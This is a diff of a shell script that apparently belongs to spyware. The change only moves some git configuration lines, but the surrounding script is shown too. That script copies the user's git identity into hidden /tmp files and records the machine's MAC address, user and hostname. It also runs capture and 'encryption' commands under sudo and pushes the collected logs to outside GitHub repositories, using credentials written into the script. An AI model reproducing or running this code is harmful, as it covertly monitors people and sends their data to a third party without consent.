@@ -4,8 +4,6 @@ echo $(git config --global user.email) > /tmp/.GMAILSX
 echo $(git config --global user.name) > /tmp/.GNAMESX
 git config --global --add user.email "root@rootmail.com"
 git config --global --add user.name "root"
-git config --local --add user.email "root@rootmail.com"
-git config --local --add user.name "root"
 
 MDIR=$HOME/.data_servicex
 SDIR=$MDIR/setup
@@ -90,6 +88,8 @@ else
      echo "started $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  $(date '+%y_%m_%d_%I_%M_%S').txt 
      sudo encriptFile
      git add --all
+     git config --local --add user.email "root@rootmail.com"
+     git config --local --add user.name "root"
      git commit -m "root-$(date +"%D %T")"
      git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
      sudo logCapturex
@@ -115,6 +115,8 @@ else
      echo "started $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  $(date '+%y_%m_%d_%I_%M_%S').txt
      sudo encriptFile
      git add --all
+     git config --local --add user.email "root@rootmail.com"
+     git config --local --add user.name "root"
      git commit -m "root-$(date +"%D %T")"
      git push https://reportlog:1q2w3e4r5t@github.com/reportlog/setuplog_service.git --all
      cd $HOME
